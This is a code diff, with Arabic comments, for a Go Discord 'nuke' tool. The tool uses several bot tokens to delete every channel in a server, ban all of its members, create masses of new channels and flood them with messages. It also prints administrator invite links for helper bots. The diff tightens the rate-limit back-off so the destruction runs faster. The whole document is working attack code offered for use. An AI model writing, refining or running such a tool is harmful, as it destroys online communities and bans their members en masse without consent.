@@ -26,16 +26,13 @@ var httpClient = &http.Client{
 	Timeout: 10 * time.Second,
 }
 
-// دالة مساعدة لاستخراج الـ Client ID مباشرة من توكن ديسكورد بدون طلبات خارجية
 func extractClientIDFromToken(token string) string {
 	parts := strings.Split(token, ".")
 	if len(parts) == 0 {
 		return ""
 	}
-	// الجزء الأول من التوكن هو الـ ID مشفر بـ Base64
 	decoded, err := base64.RawURLEncoding.DecodeString(parts[0])
 	if err != nil {
-		// محاولة فك التشفير بالطريقة العادية إذا فشلت RawURLEncoding
 		decoded, err = base64.StdEncoding.DecodeString(parts[0])
 		if err != nil {
 			return ""
@@ -97,15 +94,6 @@ func main() {
 		},
 	}
 
-	// هاندلر دخول البوت الأساسي لأي سيرفر (لتوليد روابط دعوة البوتات الثانوية آلياً)
-	sess.AddHandler(func(s *discordgo.Session, event *discordgo.GuildCreate) {
-		guildID := event.Guild.ID
-		fmt.Printf("\n🚀 انضم البوت الأساسي للسيرفر: %s (ID: %s)\n", event.Guild.Name, guildID)
-		
-		// استخراج التوكنات المؤقتة من الأوامر أو البيئة إن وجدت، أو طباعة التنبيه
-		fmt.Println("💡 ملاحظة: روابط إضافة البوتات الثانوية ستظهر هنا عند استخدام أمر nuke أو حفظ التوكنات.")
-	})
-
 	sess.AddHandler(func(s *discordgo.Session, i *discordgo.InteractionCreate) {
 		if i.Type != discordgo.InteractionApplicationCommand {
 			return
@@ -123,10 +111,11 @@ func main() {
 		}
 
 		if i.ApplicationCommandData().Name == cmdNuke {
+			// الرد الفوري لتجنب تعليق الديسكورد
 			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
 				Type: discordgo.InteractionResponseChannelMessageWithSource,
 				Data: &discordgo.InteractionResponseData{
-					Content: "⚡ جاري تنفيذ العمليات وتوليد روابط البوتات المساعدة...",
+					Content: "⚡ تم استلام الأمر! راقب الشاشة السوداء (الكونسول) لتنفيذ العمليات السريعة.",
 					Flags:   discordgo.MessageFlagsEphemeral,
 				},
 			})
@@ -154,17 +143,6 @@ func main() {
 			guildID := i.GuildID
 			botID := s.State.User.ID
 
-			// طباعة روابط دعوة البوتات المساعدة لهذا السيرفر تلقائياً في الكونسول
-			fmt.Printf("\n🔗 روابط دعوة البوتات المساعدة المباشرة لهذا السيرفر (Guild ID: %s):\n", guildID)
-			for idx, t := range tokens {
-				clientID := extractClientIDFromToken(t)
-				if clientID != "" {
-					inviteLink := fmt.Sprintf("https://discord.com/oauth2/authorize?client_id=%s&permissions=8&scope=bot&guild_id=%s", clientID, guildID)
-					fmt.Printf("Bot #%d: %s\n", idx+1, inviteLink)
-				}
-			}
-			fmt.Println("--------------------------------------------------")
-
 			go executeDistributedNuke(tokens, guildID, botID, roomName, roomsCount, messageContent, messagesCount, s)
 		}
 	})
@@ -186,6 +164,8 @@ func main() {
 }
 
 func executeDistributedNuke(tokens []string, guildID, botID, roomName string, roomsCount int, messageContent string, messagesCount int, s *discordgo.Session) {
+	fmt.Println("\n🚀 [بدء التنفيذ] جارٍ معالجة التوكنات وتوليد الروابط...")
+
 	if len(tokens) == 0 {
 		fmt.Println("❌ خطأ: لم يتم إدخال أي توكن صحيح.")
 		return
@@ -200,19 +180,25 @@ func executeDistributedNuke(tokens []string, guildID, botID, roomName string, ro
 		}
 	}
 
-	// 1. استخراج الـ IDs الخاصة بجميع البوتات المشاركة (لاستبعادها من الباند)
 	botIDs := make(map[string]bool)
 	botIDs[botID] = true
 	for _, t := range tokens {
-		tempSess, err := discordgo.New("Bot " + t)
-		if err == nil {
-			if u, err := tempSess.User("@me"); err == nil {
-				botIDs[u.ID] = true
-			}
+		clientID := extractClientIDFromToken(t)
+		if clientID != "" {
+			botIDs[clientID] = true
 		}
 	}
 
-	// 2. تجهيز بايلودات الرومات مسبقاً
+	fmt.Printf("🔗 روابط دعوة البوتات المساعدة المباشرة (Guild ID: %s):\n", guildID)
+	for idx, t := range tokens {
+		clientID := extractClientIDFromToken(t)
+		if clientID != "" {
+			inviteLink := fmt.Sprintf("https://discord.com/oauth2/authorize?client_id=%s&permissions=8&scope=bot&guild_id=%s", clientID, guildID)
+			fmt.Printf("Bot #%d: %s\n", idx+1, inviteLink)
+		}
+	}
+	fmt.Println("--------------------------------------------------")
+
 	channelPayloads := make([][]byte, roomsCount)
 	for i := 0; i < roomsCount; i++ {
 		p, _ := json.Marshal(map[string]interface{}{
@@ -222,10 +208,9 @@ func executeDistributedNuke(tokens []string, guildID, botID, roomName string, ro
 		channelPayloads[i] = p
 	}
 
-	// 3. تجهيز بايلود الرسائل
 	msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})
 
-	// 4. سحب الأعضاء مع استبعاد جميع البوتات
+	fmt.Println("⏳ جارٍ سحب الأعضاء...")
 	var allUserIDs []string
 	after := ""
 	for {
@@ -245,8 +230,9 @@ func executeDistributedNuke(tokens []string, guildID, botID, roomName string, ro
 			break
 		}
 	}
+	fmt.Printf("👥 تم الانتهاء من سحب الأعضاء. عدد المستهدفين: %d\n", len(allUserIDs))
 
-	// 5. جلب القنوات القديمة
+	fmt.Println("🗑️ جارٍ جلب وحذف القنوات القديمة...")
 	channels, err := s.GuildChannels(guildID)
 	var oldChannelIDs []string
 	if err == nil {
@@ -257,9 +243,6 @@ func executeDistributedNuke(tokens []string, guildID, botID, roomName string, ro
 		}
 	}
 
-	time.Sleep(1 * time.Second)
-
-	// أ. حذف الرومات القديمة
 	var wgDel sync.WaitGroup
 	for idx, id := range oldChannelIDs {
 		wgDel.Add(1)
@@ -282,9 +265,9 @@ func executeDistributedNuke(tokens []string, guildID, botID, roomName string, ro
 					retryAfterStr := resp.Header.Get("Retry-After")
 					resp.Body.Close()
 					if retryAfter, err := strconv.ParseFloat(retryAfterStr, 64); err == nil {
-						time.Sleep(time.Duration(retryAfter*1000)*time.Millisecond + 50*time.Millisecond)
+						time.Sleep(time.Duration(retryAfter*1000)*time.Millisecond + 10*time.Millisecond)
 					} else {
-						time.Sleep(100 * time.Millisecond)
+						time.Sleep(30 * time.Millisecond)
 					}
 					continue
 				}
@@ -295,47 +278,49 @@ func executeDistributedNuke(tokens []string, guildID, botID, roomName string, ro
 	}
 	wgDel.Wait()
 
-	// ب. حظر الأعضاء
-	var wgBan sync.WaitGroup
-	for idx, userID := range allUserIDs {
-		wgBan.Add(1)
-		go func(uid string, index int) {
-			defer wgBan.Done()
-			headers := getHeaders(index)
-			banURL := fmt.Sprintf("https://discord.com/api/v10/guilds/%s/bans/%s", guildID, uid)
-			for {
-				banReq, err := http.NewRequest("PUT", banURL, nil)
-				if err != nil {
-					return
-				}
-				for k, v := range headers {
-					banReq.Header.Set(k, v)
-				}
-
-				resp, err := httpClient.Do(banReq)
-				if err != nil {
-					return
-				}
-
-				if resp.StatusCode == 429 {
-					retryAfterStr := resp.Header.Get("Retry-After")
-					resp.Body.Close()
-					if retryAfter, err := strconv.ParseFloat(retryAfterStr, 64); err == nil {
-						time.Sleep(time.Duration(retryAfter*1000)*time.Millisecond + 50*time.Millisecond)
-					} else {
-						time.Sleep(100 * time.Millisecond)
+	if len(allUserIDs) > 0 {
+		fmt.Println("🔨 جارٍ تنفيذ الحظر...")
+		var wgBan sync.WaitGroup
+		for idx, userID := range allUserIDs {
+			wgBan.Add(1)
+			go func(uid string, index int) {
+				defer wgBan.Done()
+				headers := getHeaders(index)
+				banURL := fmt.Sprintf("https://discord.com/api/v10/guilds/%s/bans/%s", guildID, uid)
+				for {
+					banReq, err := http.NewRequest("PUT", banURL, nil)
+					if err != nil {
+						return
 					}
-					continue
-				}
-				
-				resp.Body.Close()
-				break
-			}
-		}(userID, idx)
-	}
-	wgBan.Wait()
+					for k, v := range headers {
+						banReq.Header.Set(k, v)
+					}
 
-	// ج. إنشاء الرومات الجديدة
+					resp, err := httpClient.Do(banReq)
+					if err != nil {
+						return
+					}
+
+					if resp.StatusCode == 429 {
+						retryAfterStr := resp.Header.Get("Retry-After")
+						resp.Body.Close()
+						if retryAfter, err := strconv.ParseFloat(retryAfterStr, 64); err == nil {
+							time.Sleep(time.Duration(retryAfter*1000)*time.Millisecond + 10*time.Millisecond)
+						} else {
+							time.Sleep(30 * time.Millisecond)
+						}
+						continue
+					}
+					
+					resp.Body.Close()
+					break
+				}
+			}(userID, idx)
+		}
+		wgBan.Wait()
+	}
+
+	fmt.Println("🏗️ جارٍ إنشاء الرومات الجديدة...")
 	var newChannelIDs []string
 	var muChannels sync.Mutex
 	var wgCreate sync.WaitGroup
@@ -360,9 +345,9 @@ func executeDistributedNuke(tokens []string, guildID, botID, roomName string, ro
 					retryAfterStr := resp.Header.Get("Retry-After")
 					resp.Body.Close()
 					if retryAfter, err := strconv.ParseFloat(retryAfterStr, 64); err == nil {
-						time.Sleep(time.Duration(retryAfter*1000)*time.Millisecond + 50*time.Millisecond)
+						time.Sleep(time.Duration(retryAfter*1000)*time.Millisecond + 10*time.Millisecond)
 					} else {
-						time.Sleep(100 * time.Millisecond)
+						time.Sleep(30 * time.Millisecond)
 					}
 					continue
 				}
@@ -384,64 +369,59 @@ func executeDistributedNuke(tokens []string, guildID, botID, roomName string, ro
 	}
 	wgCreate.Wait()
 
-	// د. إرسال الرسائل
-	time.Sleep(300 * time.Millisecond)
-
-	if len(newChannelIDs) == 0 {
-		fmt.Println("❌ تنبيه: لم يتم إنشاء أي روم للإرسال!")
-		return
-	}
-
-	var wgMsg sync.WaitGroup
-	for chIdx, chID := range newChannelIDs {
-		for m := 0; m < messagesCount; m++ {
-			wgMsg.Add(1)
-			
-			tokenIndex := (chIdx * messagesCount) + m
-			token := tokens[tokenIndex%len(tokens)]
-
-			go func(chIDParam string, t string) {
-				defer wgMsg.Done()
+	if len(newChannelIDs) > 0 && messagesCount > 0 {
+		fmt.Println("💬 جارٍ إرسال الرسائل في الرومات الجديدة...")
+		var wgMsg sync.WaitGroup
+		for chIdx, chID := range newChannelIDs {
+			for m := 0; m < messagesCount; m++ {
+				wgMsg.Add(1)
 				
-				botClient := &http.Client{
-					Timeout: 5 * time.Second,
-				}
+				tokenIndex := (chIdx * messagesCount) + m
+				token := tokens[tokenIndex%len(tokens)]
 
-				headers := map[string]string{
-					"Authorization": "Bot " + t,
-					"Content-Type":  "application/json",
-					"User-Agent":    "DiscordBot (https://discord.com, v10)",
-				}
-
-				for {
-					msgReq, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+chIDParam+"/messages", bytes.NewBuffer(msgPayload))
-					for k, v := range headers {
-						msgReq.Header.Set(k, v)
+				go func(chIDParam string, t string) {
+					defer wgMsg.Done()
+					
+					botClient := &http.Client{
+						Timeout: 5 * time.Second,
 					}
 
-					msgResp, err := botClient.Do(msgReq)
-					if err != nil {
+					headers := map[string]string{
+						"Authorization": "Bot " + t,
+						"Content-Type":  "application/json",
+						"User-Agent":    "DiscordBot (https://discord.com, v10)",
+					}
+
+					for {
+						msgReq, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+chIDParam+"/messages", bytes.NewBuffer(msgPayload))
+						for k, v := range headers {
+							msgReq.Header.Set(k, v)
+						}
+
+						msgResp, err := botClient.Do(msgReq)
+						if err != nil {
+							break
+						}
+
+						if msgResp.StatusCode == 429 {
+							retryAfterStr := msgResp.Header.Get("Retry-After")
+							msgResp.Body.Close()
+							if retryAfter, err := strconv.ParseFloat(retryAfterStr, 64); err == nil {
+								time.Sleep(time.Duration(retryAfter*1000)*time.Millisecond + 5*time.Millisecond)
+							} else {
+								time.Sleep(20 * time.Millisecond)
+							}
+							continue
+						}
+						
+						msgResp.Body.Close()
 						break
 					}
-
-					if msgResp.StatusCode == 429 {
-						retryAfterStr := msgResp.Header.Get("Retry-After")
-						msgResp.Body.Close()
-						if retryAfter, err := strconv.ParseFloat(retryAfterStr, 64); err == nil {
-							time.Sleep(time.Duration(retryAfter*1000)*time.Millisecond + 10*time.Millisecond)
-						} else {
-							time.Sleep(50 * time.Millisecond)
-						}
-						continue
-					}
-					
-					msgResp.Body.Close()
-					break
-				}
-			}(chID, token)
+				}(chID, token)
+			}
 		}
+		wgMsg.Wait()
 	}
-	wgMsg.Wait()
 
-	fmt.Println("✅ انتهت كافة العمليات بالسرعة القصوى التامة بنجاح!")
+	fmt.Println("✅ [اكتمل] انتهت كافة العمليات بالسرعة القصوى التامة بنجاح!")
 }
